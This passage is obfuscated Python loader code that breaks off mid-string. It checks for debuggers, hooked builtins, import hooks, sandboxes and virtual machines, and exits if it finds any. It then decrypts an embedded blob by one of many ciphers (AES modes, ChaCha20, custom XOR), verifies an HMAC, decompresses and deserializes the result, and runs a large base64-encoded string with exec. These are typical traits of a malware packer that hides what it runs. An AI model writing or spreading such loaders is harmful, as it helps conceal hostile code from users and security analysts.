    _pxxsjpa = bytes.fromhex("a4e693e7e783e2a193b3bebf8285a6e6b29dec9eae86869abb9d85b39e969bbfe2b880938de0ada79880acb080e6b8b7bdec87a5a2e4e095929fba99bee483b692b3bcba909592e29be7e4b9e2a29190b08cac9383e097b7adec97b9b78c80e3bf9fbebf9c8e9d98b0979ebd9ae0b79c83a2a7979ee69887b6b2b69595adb0e49f98e2b19783e0819992a796a484819cb695b281b5b2ba90a1b6adbcb69695b1a3a2ede6b9e1b28187bfe2e19ee285bdb68cb196bbe280e0829792e192999ce19298b8b18c86a6ae8ce0eda29793e093beadbfb1a59eb79997e59cb1b091a5eca1ede59ae19798bae2e28180e4e484a29895a6a6b9b383ec9ab1aea2e7e29a9fedb58c93b184bae586bcbb96e7b69bbb818d8382e6979ce5a299b5e4b8bc9099e199e7ba96a785bc9a9fa0bbb0e6bcbaa3a1e486a0e3edb7a39e808eb0819798e7b0b5a5999e978283a7b1a09c859fe6ec93be8cba9598a4e0b8e5b393a5839e86b5e1b799e0b187b2829aa2e4a7a7bf9ea1e1bb8398a6ecadadadb1e499a0b09fa38e87b59a939f9f8ce682bcb88c82a7e4bdec85999293a0b68590ad8d93e398879c83a1b18c8ea09187b9a2909d9bb2adbc99809feca2b196b1939abce085e5839795a295e095bd9cbfaceca4b89093a7bf81ed97858d9098edada385e4b582e58eb0b7e3ace1b5e1ed878ee58e8e8ce2818e9f8dace3b897e7ed91b099848dba9bb3869e9cec8eb2a3bfe192a7a3b2909a91a2e2a3aea792a1b19399bb919db0b3b3bf87b9b3ade59f96959d97a781b985a6998cac9997a0b0a690bf9d85adb3b2a685b2aeadbaa4b5e5a3ecaea0bd8ce6acb380aca6a6b082b193a4a0b6e19aa7aeece7b390bbb79799b3e1aea3bf99e69e9eb6829ab68398b0e2ad98b9e5929aa1919fa2b3e785ba98e38295bbb8e69eb9be85b7a78ce286ece28085b69abd81ad90e695958c96b1b9a397e39084b99ce6b2a592e1e0e1a5e1b59193879e82838d87e29585e3e7b383bd9ce5ac988da5e0a5e08ca596b38ce3bea0a69c9587a79cace3a2bd80a0819396a2b09ca49987e68c8ee690e797ace491bee0be8c99bee5a5e19a988eb786b2819be3b9e79c9cbba0a7a598ac9782e393838ebdbdb7a1958cbcbee1bc8cbb92a6ed95828592bf9fe4a1b5878dbf9996bd8e92e2bf82a4e491e1b7b180a5ba9e9ceda29ab59bedb192a18ea0eca78db9878ebbba9d9899a7bb9e9fbae0ed95879ab192bba0b0a7a1bf84e1b69c9f919c9b85a1bd8598a0e085bae2e38ce0b1e1b08eed9c92a3e5e092ae9593aeb3b9ecb592a5b7a28d80edae988691b2b9ba82b7a18695b597858db69c80bebabb96a6ede698babea5b98cb291bb8ce79e919ba2a4ad95a1bbe7b59cbfb6ba828e9d9b9d9d9b81bc91edec96ec80b39ab887b7ec95bbb6bcbea3ba9abfbd879ce196bce3bcbe81")
    _pxxsjpa = bytes(_ ^ 212 for _ in _pxxsjpa).decode()
    _fzpqwo.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _fzpqwo.modules:
            _fzpqwo.stderr.write('error: debugger detected\n'); _fzpqwo.exit(1)
    _brxsij = _kfmetk.b64decode(_ppmyzlmls)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_fzpqwo.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _fzpqwo.stderr.write('error: hook detected\n'); _fzpqwo.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _edyyk, algorithms as _asiekfpkv, modes as _bznvapask
    except ImportError:
        _fzpqwo.stderr.write("error: cryptography not installed\n"); _fzpqwo.exit(1)

    if len(_fzpqwo.meta_path) > 5:
        _fzpqwo.stderr.write('error: import hook detected\n'); _fzpqwo.exit(1)
    if getattr(_fzpqwo, 'flags', None) and _fzpqwo.flags.no_user_site:
        _fzpqwo.stderr.write('error: sandbox detected\n'); _fzpqwo.exit(1)
    import os
    if any(x in str(_fzpqwo.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _fzpqwo.stderr.write('error: virtual machine detected\n'); _fzpqwo.exit(1)
    if _rllvrkmjj == 12:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=64)
        _mcejns = _esqjnvzk[:32]; _pnddwajqq = _esqjnvzk[32:64]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _auacd = 3 + (_jtfvdovun[0] & 7)
        _jtfvdovun = bytearray(_mwjmvmfuh)
        for _qtwciag in range(_auacd - 1, -1, -1):
            _qqeasm = (3 + _qtwciag) & 7
            _xizsl = (_qtwciag * 0x1B + 0x5A) & 0xFF
            for _cacjrhis in range(len(_jtfvdovun)):
                _auacd = _jtfvdovun[_cacjrhis]
                _auacd ^= _xizsl
                _auacd = ((_auacd >> _qqeasm) | ((_auacd << (8 - _qqeasm)) & 0xFF))
                _auacd ^= _mcejns[(_qtwciag * len(_jtfvdovun) + _cacjrhis) % len(_mcejns)]
                _jtfvdovun[_cacjrhis] = _auacd
        _lapvp = bytes(_jtfvdovun)
    elif _rllvrkmjj == 4:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=80)
        _mcejns = _esqjnvzk[:32]; _cacjrhis = _esqjnvzk[32:48]; _pnddwajqq = _esqjnvzk[48:80]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _eaiecr = _edyyk(_asiekfpkv.ChaCha20(_mcejns, _cacjrhis), mode=None)
        _lapvp = _eaiecr.decryptor().update(_mwjmvmfuh)
    elif _rllvrkmjj == 7:
        _lapvp = _kfmetk.b32decode(_brxsij)
    elif _rllvrkmjj == 6:
        _lapvp = _kfmetk.b64decode(_brxsij)
    elif _rllvrkmjj == 9:
        def _qkpjk(_csnlgxwb):
            if _csnlgxwb[:2] == b'<~': _csnlgxwb = _csnlgxwb[2:]
            if _csnlgxwb[-2:] == b'~>': _csnlgxwb = _csnlgxwb[:-2]
            _gdotidx = bytearray(); _xynhqvcx = 0
            while _xynhqvcx < len(_csnlgxwb):
                if _csnlgxwb[_xynhqvcx] == 122:
                    _gdotidx.extend(b'\x00\x00\x00\x00'); _xynhqvcx += 1; continue
                _mowyf = 0; _rslzrkai = 0
                while _xynhqvcx < len(_csnlgxwb) and _rslzrkai < 5:
                    _mowyf = _mowyf * 85 + (_csnlgxwb[_xynhqvcx] - 33); _xynhqvcx += 1; _rslzrkai += 1
                _fwloaikz = _rslzrkai - 1
                if _fwloaikz > 0: _gdotidx.extend(_mowyf.to_bytes(4, 'big')[4-_fwloaikz:])
            return bytes(_gdotidx)
        _lapvp = _qkpjk(_brxsij)
    elif _rllvrkmjj == 5:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=64)
        _mcejns = _esqjnvzk[:32]; _pnddwajqq = _esqjnvzk[32:64]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _lapvp = bytes(_mwjmvmfuh[i] ^ _mcejns[i % 32] for i in range(len(_mwjmvmfuh)))
    elif _rllvrkmjj == 2:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=80)
        _mcejns = _esqjnvzk[:32]; _cacjrhis = _esqjnvzk[32:48]; _pnddwajqq = _esqjnvzk[48:80]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _eaiecr = _edyyk(_asiekfpkv.AES(_mcejns), _bznvapask.CTR(_cacjrhis))
        _lapvp = _eaiecr.decryptor().update(_mwjmvmfuh)
    elif _rllvrkmjj == 10:
        _lapvp = bytes.fromhex(_brxsij.decode('ascii'))
    elif _rllvrkmjj == 11:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=64)
        _mcejns = _esqjnvzk[:32]; _pnddwajqq = _esqjnvzk[32:64]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _auacd = _mcejns[0]
        _lapvp = bytearray()
        for _qtwciag in range(len(_mwjmvmfuh)):
            _jtfvdovun = _mwjmvmfuh[_qtwciag] ^ _auacd
            _lapvp.append(_jtfvdovun)
            _auacd = _mwjmvmfuh[_qtwciag] ^ _mcejns[ (_qtwciag + 1) % len(_mcejns) ]
            _auacd = (((_auacd << 3) & 0xFF) | (_auacd >> 5)) ^ 0x5A
        _lapvp = bytes(_lapvp)
    elif _rllvrkmjj == 13:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=80)
        _mcejns = _esqjnvzk[:32]; _cacjrhis = _esqjnvzk[32:48]; _pnddwajqq = _esqjnvzk[48:80]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        import struct as _gxmcytdr
        def _qqeasm(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_gxmcytdr.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_gxmcytdr.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_gxmcytdr.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _qtwciag = _gxmcytdr.unpack('<I',_cacjrhis[:4])[0]
        _cacjrhis = _cacjrhis[4:]
        _jtfvdovun = bytearray()
        while len(_jtfvdovun) < len(_mwjmvmfuh):
            _auacd = _qqeasm(_mcejns, _qtwciag, _cacjrhis)
            for _xizsl in range(min(64, len(_mwjmvmfuh) - len(_jtfvdovun))):
                _jtfvdovun.append(_mwjmvmfuh[len(_jtfvdovun)] ^ _auacd[_xizsl])
            _qtwciag += 1
        _lapvp = bytes(_jtfvdovun)
    elif _rllvrkmjj == 8:
        _aqkaisgux = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _gsjhsy = {c:i for i,c in enumerate(_aqkaisgux)}
        def _uqhoa(_ewehgen):
            _efygpqmk = bytearray(); _jqisaa = 0
            while _jqisaa < len(_ewehgen):
                _gwhnkjvr = 0; _zynfnb = 0
                while _jqisaa < len(_ewehgen) and _zynfnb < 5:
                    _gwhnkjvr = _gwhnkjvr * 85 + _gsjhsy[chr(_ewehgen[_jqisaa])]; _jqisaa += 1; _zynfnb += 1
                _uzrjrft = _zynfnb - 1
                if _uzrjrft > 0: _efygpqmk.extend(_gwhnkjvr.to_bytes(4, 'big')[4-_uzrjrft:])
            return bytes(_efygpqmk)
        _lapvp = _uqhoa(_brxsij)
    elif _rllvrkmjj == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _tyvhvk
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _lapvp = _brxsij[16:-32]
        _mwjmvmfuh = _lapvp[:-16]; _auacd = _lapvp[-16:]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=76)
        _mcejns = _esqjnvzk[:32]; _cacjrhis = _esqjnvzk[32:44]; _pnddwajqq = _esqjnvzk[44:76]
        _doundjrju = _wniiz.new(_pnddwajqq, _lapvp, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _lapvp = _tyvhvk(_mcejns).decrypt(_cacjrhis, _mwjmvmfuh + _auacd, None)
    elif _rllvrkmjj == 1:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=80)
        _mcejns = _esqjnvzk[:32]; _cacjrhis = _esqjnvzk[32:48]; _pnddwajqq = _esqjnvzk[48:80]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _eaiecr = _edyyk(_asiekfpkv.AES(_mcejns), _bznvapask.CBC(_cacjrhis))
        _lapvp = _eaiecr.decryptor()
        _lapvp = _lapvp.update(_mwjmvmfuh) + _lapvp.finalize()
        _auacd = _lapvp[-1]
        if _auacd < 1 or _auacd > 16 or not all(_ == _auacd for _ in _lapvp[-_auacd:]):
            _fzpqwo.stderr.write("error: decryption failed\n"); _fzpqwo.exit(1)
        _lapvp = _lapvp[:-_auacd]
    elif _rllvrkmjj == 0:
        _jtfvdovun = _brxsij[:16]; _fzybgvsmj = _brxsij[-32:]; _mwjmvmfuh = _brxsij[16:-32]
        _esqjnvzk = _vecrlj.pbkdf2_hmac('sha256', _pxxsjpa.encode(), _jtfvdovun, 100000, dklen=64)
        _mcejns = _esqjnvzk[:32]; _pnddwajqq = _esqjnvzk[32:64]
        _doundjrju = _wniiz.new(_pnddwajqq, _mwjmvmfuh, digestmod='sha256').digest()
        if not _wniiz.compare_digest(_fzybgvsmj, _doundjrju):
            _fzpqwo.stderr.write("error: integrity check failed\n"); _fzpqwo.exit(1)
        _eaiecr = _edyyk(_asiekfpkv.AES(_mcejns), _bznvapask.ECB())
        _lapvp = _eaiecr.decryptor()
        _lapvp = _lapvp.update(_mwjmvmfuh) + _lapvp.finalize()
        _auacd = _lapvp[-1]
        if _auacd < 1 or _auacd > 16 or not all(_ == _auacd for _ in _lapvp[-_auacd:]):
            _fzpqwo.stderr.write("error: decryption failed\n"); _fzpqwo.exit(1)
        _lapvp = _lapvp[:-_auacd]
    else:
        _fzpqwo.stderr.write("error: unsupported algorithm\n"); _fzpqwo.exit(1)
    _vk = bytes.fromhex("642f1286b63082aa105c445619e5ddbb168549e3aa2801952aea1012a58d45dd")
    _vn = bytes.fromhex("a88ea3d7a4509d4994f3d298a6fcbcb9")
    _sig = _lapvp[-32:]
    _pl = _lapvp[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _fzpqwo.stderr.write('error: VM integrity check failed\n'); _fzpqwo.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _lapvp[1] == 1:
        import zlib as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 2:
        import lzma as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 3:
        import bz2 as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 4:
        import brotli as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 5:
        import zstandard as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 6:
        import gzip as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 7:
        import lz4.frame as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 8:
        import snappy as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 9:
        import gzip as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    elif _lapvp[1] == 10:
        import blosc as _mxbksfpjr
        _pd = _mxbksfpjr.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_kfmetk.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdRd3V6NXExVUl5d3ZkSkdiZ1BYUWZoVmUyaGZUOWloVWJ2VFpZTnBxcmY4PScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnb0duN2M3dXlQaGsvdWZxOFhkU213Y0tFazNoRWdJT1luS3pFUTRQeUs0U2NSK0hPY2FzOTZBMFh0OTVVZHF5MFVZb2pkQmxLRk9TdldrREtpcjhWUUJmbnI1WlBKdy9IcEpaL2dOaUxKVjVyL0RLZS9IaXNHaWVNaHVmTmpqTlVMeVBZTmxhRFhrNERrSGoxMTBMM01XRmNMbzh6SlpCWFk5M1Jjbm1FQUt0T05DcjJ3ekNnUzVpa0FYYkRuOGN4NDYyM1lYczU0cmVqOVVPcm5kWUJ2UmRCMGU5VFA0cHlpV2t6czlCaWdlbjdnbXQ0aS9PMjJkRTBBUFVnRmtHVEx6dEUveFJXdm8xZHhyQTR5bCtFdGthdHZQZVVCd0h4cFprUjd3PT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnUkJGVDdrdVBmMlVXcm5lKzBiUUpLTnF3azRCdk9hMkVkZzNBb2tFZmt1dWkvd2lOR29zSCtuZzNZdmJRRDVaUlA3VFEzbWNOaitGaVJ4KyttYVZJMElxOTFWMWN0ZWl6cUpjOXhDbDJ5dmRRRWxWRjB0ckxKREIzMDNzVGppalNOV2xSaVdpSEErN3ovZHg4WEE0NllrZGZwNUtldWRUUHl1K0Rwd0lkTlY0bG5pSzlMTW10aDBVU1AxVkNUajkxaUp5bGU1TUVNc1NZakxVeVpITXdpbGVyZlJnR1h2ZmhSb3BQT3E1Z29ka1Y1K2hydG9BeWFpeURTbFlhWWM4M0dya0Y2a3dCQ2FKZXl6aW1KaGtXMWtibXVQeTZrRm1NRmVVaC9MMDVvZitqWENMeHBmdXdMUTViZnZsenZBPT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnd3VRemh3V0RFUk9pS2pFNHF5RTBadTJMQitiOGJPdlRFdkpIdFFzbk16c2VGdHBCMUhWYm5rWkM1ODRrOGozSzJaVm9lUlVuMDZIaFROZXR3ZWhZZ216QXF5MlNWYjVzNzdBRzQvTVJSa2hlblIxelBRWVk3cWhCV05mOXlXbm1BR1dSU0RVOEVsaVNCWGdUN3BpaEZ1UXBOQTBsVnVOWkRjd3JSR1QzQ2EyTWliVzlQRG5yVDg4U21LN3VtcXBCdVlhZGxuLzBxbUU2c2V2d3Rua0VSeENUNzBaMmdXM0paUWRqWWRRYWdTcnZGMlVMMzM5eTNYOTF3T3NBMngxMmNETWJpZHhySEhEMEtwYlJGWDRKVmZ5UjhvdmhzRmRjay9oV0pDSWVyL1UzT1lzYi9ZaWNFMVkyVXIxWVJINjkvbklEJyksIGJhc2U2NC5iNjRkZWNvZGUoJ3VqUnlCeERkMktib21iZWVLN0tER1ZNL1ptR0lKYVZkTHI0bGptWW1ZMWtqeFR5NkZvV1VTSUh6eTZtRGZSUmhMUGk4U0hUeXp6d2JIS013K1JLK1dzMWhBU1RRbndNSm8xcUJQYnNZd0JDRnJjdGdBNWpEZGx2bjRnaWpvZ2prQzNIdlNvZDRkZ2hMd3htck9qaWZDWlNNdy9YT0oyTEZONTdvQUJoU1hmK0J4cmtwTFk4YXZIZ21KVjEva1RDOHFaM3gvNTVWTjd6VzY1VEJVOFZrSDBlUENiWlAzNGdEZEdGUEt1QTk0TTVCZE5XcVFtQkdJVnE2eStYNkVFellxdlFmRWM4UEJkaXViTEc5eUM5Tm1sdFMvNE9wUkJ3QnJIWG4yMzZLK1psaHBieXVCSWEyZlhURERxM0RkRWdlVElnMDdxRXV4Q3psUnBJVGdVMW1DaXlYeHJ4S2h1ZUc1Tm5tUVNLV3BrSWh2Q0dvNVJzUzdpTGF5RG1odzlEZkJRL1NJWXdyOHBEMFRMYWNXNFkxN1R5REx4SkxpQTNWVUNGalBPeVBMeXN4RndTU0l5bmJOeEJTT2JPVDNLQlJSVHg5d1VlbjBNV00rQ3NSRU1XNDRVK3FwSi9adTMrbGdtamhhK0FIVXluWmFTN1I5NXlpUG9EU2ErRFdaR0NhVWJtVzJXN1Ztek53bEljZ2dEVFY0QkhxRjlIYS9odVBTTVhJdG8rc1pBbU5mdDg2ZzBLeE8xcWVHT014dVYrbGkyZHkvRjBJcnJTNEpNZGVPU2trZ3dkVExWWm92bzhVdkh2VkY0SVdJQVdWeG5NMllXMW9mME16cVhOcmZSRXkxZUVqcUhRNThVZUpJVk85amh1YUExVUw5aUZwbytkK3lORHM4T2U4NGd4dmxaL1pxWTJ5YStUSk9JZXVweW5pcmZWVEQ4c0tGSWpkNW0vdTQ0bEVEa0NoQjFJQU5wSnFlcm1aM21vUzFZQ2JhcmJWZit0cFczTm11VFdjUWJDUnFYUFNzTmtkYzdKUWpncE95aFpScTJmenRsdUtNaG9qQzNHQTdaNDRKcnNRTFZKelFqRzAvb0x3Z1NVWEtHQ0JMSHpHMmc5dUkvWTNVQjhVTlYvWkl3Qll1NkloeGNtUFFBRnlaZkdaamwzWnhiZnJHQ2JpKzVYNEpNdW13dWMzckIvd1BLZllrZ1NHblYybjI2djNtaDNjWlVOMnZ4N1FBVWVycit2WUxoOG9LNDVwVUxSZHJ0QXRXRHRWUVA0UnNmSDRsMDI2SjNEN0tlNEtYMXFOZW1rbUs3UHlVUjQreWJRRlZaN0pCeWFSK05hMnFSRDNyU2lhaTZvWVM4bnZlL25XZHV6ZFFwUEwwN29NcnFBa295UXRlZTNPNzJnTHJjY29veUVFOEIwNFBQZlNCSVBydjFMdDRUbTlMaWVmV3pIT3ptcXVqTzBtRnp2cXZVUlZQbUNVWUlVUHU4RGhTUnVnQWY1NVBVaUd3d3BWRmtiRFhhV3BORjJHT3F5MHhjUEpGeVF1TXUxd3V2VUtHZHFpdDFaU3RaYUdwcElOWUt0MmZMc1krM0pQTFBHUU1ZVy9UOVU1ZFlXTGVRT1ZZWFJpOGdPSGJYcVhPNFcwL1hITFFhbWdFNTZHMkt4MGkwWW5nYm9pVlpVMDhHclloNUVPT3hFV3kwMUFGWTJMZ0p6bU9RbXVwRkFsRGREZHJOWUQ3OXY5cTg3d1JQbmoxbHB4UVN1R3dCallWQ0xqTHpkbE5GN3FHaFF6YXJya3c0a3R0R0JtendCQkNQZGFoVHZkMysyRmFYKzNFdi96b2d6Z3BwM1A1UHNCdEhpSkl4UmViTVZnSE9GaHV3QVk4bmVUd3MyT2hIbFNaY2ZpcTFBOWVYd3NPeDg2eklOR1J5Q3N6LzZCY1V2Qnd1R2ZCb0w0UzdrL3AyVUczZnU5RUpvK1JDNk54SGR5Mnl0dk01OVh0S2hrakh6MlVSYlpkS3BrUEx5TlNjaVdUaEFhSHk3a1Z3OUpmTjh2ZmR4bit2MlZLR0ZHazFKYmpJc0F0c0JHeC9YY0svb3VqeGFpSkgvTXFsWkxQdkFlZjl4Tjd0NVlDdEtDNkhjcDc4UEoxeEZTaElIRjdzcEU4Z1BKMXl3Z0VlRC9kRXBGVUNKYTZQTkJmd0RISVE4dzlGM1o1dzFoQzZxSHkxZjUzL1hyMzlWWGx6cnorMW5LSlMxeHhFQzBEZXk2VkVZMmZmMmx5cndUY2l3b1dPbWR4dGF4VENMZzVvbk5tV2hoSnExZFBObGZ3Sm9zWmhJWE0weDIvWGR2bGRDZUF4OUthckNJN2xuSEI4TlVLYVhBR3N5bnl0NWxUSTdCUXp3OGFkd3hPQ0hPN1ZOeEtnOGFMK3ZwZHNmTnYrSG9NT3hSQ29FalJMd21wTitWbU50NU1BRkR2YjdWRU9pZDc1UHkvVVc2WktUbG9NNE1ZM1RxdE1WMm1RYlhma1h6NWRidXIxaS9JTHREdFBUUFBNdll0YjhMaUw2N0x3eG9TZzl6YUlYdXk5RGUzbFdzTXM5clF5VlpFYVBBbXY4Wm5BaW9ZODgvM3Znd2JMY2t0bjl4MXVjc0ljaVlxbk5xb2N2QnVRTFBNN2Nka2pmY1I2cEFzZjRGVWMyeHJJM2gvYmloamNpWDB3NjYxNG5KMHA4OGp5THhiVmFLbnF2bS9WMGs2U1NVbjRjMVJDdTk0T2xKR28veXhTWHlWcVhuVVIyMS83Zjg2R0JrcDhmYnllRnppQVByemk1SmFkb2RTb3RiVittMk5BUHlDbTVzQUVmb1kvTElVa3lkVUx1b2JJVnJxM1ZOUWk2TnNBbTZTQVVYNEdzdTR0a2VEaC9ZQVIxZzE0NTgwNEJJdFplNG9JaHNva0J4UFUvZ1gvNkVzbHRuYXEwQXFndnZva1UvbnJOQmppUDcyVHRRU0d0RXh0cWd5a2drZFptdFlHRnNvdWJiakVuNVR1R0NQQzlpZCtEdmxjL2laK21RSEQrdWJjazBYZWpFTU8zMGlhc0diUzBGbDlqelEydGZDMVp0a3dob0Rlbi9pVEYwd1dBWGZvNDBJT3hsV0twVFFNVWhFb2dYQ2ltd0FUMllLYVFsRzlLNjZ3eHFpN1JjaGJ5c0NOQUVYeUF1NUsvNHo3UzdWeXRQaFpFRzBpYTVYeFpvVnM4YlFZQTl2M2FqNXpra0ZJa1Y2VTZCMjhOdDVZekg4UUFkQVptZHRuRU95SXFlaVFWTTdDelJlaEtrTDN4QWFvRExhWEdjVzVWdytMQXg3S0t4Y3Jzb05OKzVkZzhscHlEci9Od0laNjRKcXY5cTJxemVTMk13aGJ6OVFwSDh5OWpNWkVVV2dmQ3B5bU8wQVBJc0VLRFl6Umxjd0hoOWYvcng1TjFHNDFBYTIxeFFuNXRLSHVIdGJpQis0bjNtd013cWtMYjBBNnJRQko2a1lTV0htakFGbkFrUTR2NFJxQXFIbnNXVldUbnZBakNRbm52UVIzZ2JMZXQwcXU0eG5jZzNQUHl6MWw3by9vdzFjT0xhUEptSDFHZUV3UzFSbEowVGhYSTlYaVBDMHFMbWkzcXNsVjVFYXpRKzM3NVorNWVZaUtXcDRuV3JGSzdsc09EamhyVW9rTThZRHpLR2Y4QzdKV2pRU08wZWNDQ25oaGdjdnlmMzZndm1udG1UUnFpVmF5QkFpR3lLWVlDWm1LM3h2dlFmUnFONEY2bUJCOTliOGY3TldEcWNGKzRwYUdmYllYMm9OT3RpUUIxeHhWVHZ4Yk51YUR2bFNmSHRFUW9rVkZFek83TUtyaEFwanZoazdjcVhWeU1sVzRMc2YwOUEwejRuWDVNV3dYM01jVEpwcUZYcFdPOVFMa0owTkVDcEl